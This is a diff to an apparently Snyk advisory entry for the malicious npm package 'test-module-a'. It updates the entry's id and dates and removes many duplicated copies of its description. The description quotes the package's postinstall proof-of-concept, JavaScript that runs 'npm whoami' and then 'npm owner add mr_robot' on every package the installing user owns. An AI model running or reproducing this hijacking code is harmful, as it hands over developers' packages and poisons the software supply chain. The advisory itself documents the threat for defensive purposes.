@@ -1,5 +1,5 @@
 ---
-- id: snykio:npm:test-module-a:2017-08-08
+- id: snykio:npm:test-module-a:20170917
   title: Malicious Package
   description: "`test-module-a` is a malicious package that uses `postinstall` scripts\nto
     perform malicious activity, like adding the owner of the malicious\npackage as
@@ -17,102 +17,6 @@
     (user) {\n      if (user) {\n        getModulesOwned(user, function (modules)
     {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
     'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
-    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`test-module-a`
-    is a malicious package that uses `postinstall` scripts\nto perform malicious activity,
-    like adding the owner of the malicious\npackage as an owner to all packages owned
-    by the user who performed `npm\ninstall`.\n\nThis is especially dangerous in production
-    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
-    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
-    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
-    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
-    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
-    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
-    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
-    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
-    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
-    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
-    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
-    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
-    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`test-module-a`
-    is a malicious package that uses `postinstall` scripts\nto perform malicious activity,
-    like adding the owner of the malicious\npackage as an owner to all packages owned
-    by the user who performed `npm\ninstall`.\n\nThis is especially dangerous in production
-    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
-    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
-    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
-    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
-    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
-    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
-    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
-    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
-    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
-    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
-    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
-    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
-    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`test-module-a`
-    is a malicious package that uses `postinstall` scripts\nto perform malicious activity,
-    like adding the owner of the malicious\npackage as an owner to all packages owned
-    by the user who performed `npm\ninstall`.\n\nThis is especially dangerous in production
-    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
-    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
-    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
-    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
-    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
-    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
-    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
-    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
-    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
-    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
-    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
-    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
-    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`test-module-a`
-    is a malicious package that uses `postinstall` scripts\nto perform malicious activity,
-    like adding the owner of the malicious\npackage as an owner to all packages owned
-    by the user who performed `npm\ninstall`.\n\nThis is especially dangerous in production
-    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
-    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
-    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
-    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
-    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
-    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
-    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
-    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
-    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
-    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
-    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
-    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
-    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`test-module-a`
-    is a malicious package that uses `postinstall` scripts\nto perform malicious activity,
-    like adding the owner of the malicious\npackage as an owner to all packages owned
-    by the user who performed `npm\ninstall`.\n\nThis is especially dangerous in production
-    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
-    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
-    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
-    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
-    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
-    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
-    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
-    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
-    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
-    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
-    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
-    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
-    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`test-module-a`
-    is a malicious package that uses `postinstall` scripts\nto perform malicious activity,
-    like adding the owner of the malicious\npackage as an owner to all packages owned
-    by the user who performed `npm\ninstall`.\n\nThis is especially dangerous in production
-    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
-    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
-    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
-    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
-    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
-    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
-    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
-    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
-    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
-    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
-    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
-    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
     and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n"
   affected_package: test-module-a
   vulnerable_versions:
@@ -121,6 +25,9 @@
   package_manager: npm
   cwe:
   - CWE-506
+  disclosed_date: 2017-08-08
+  created_date: 2017-09-17
+  last_modified_date: 2017-09-17
   credit:
   - Jordan Wright
   references:
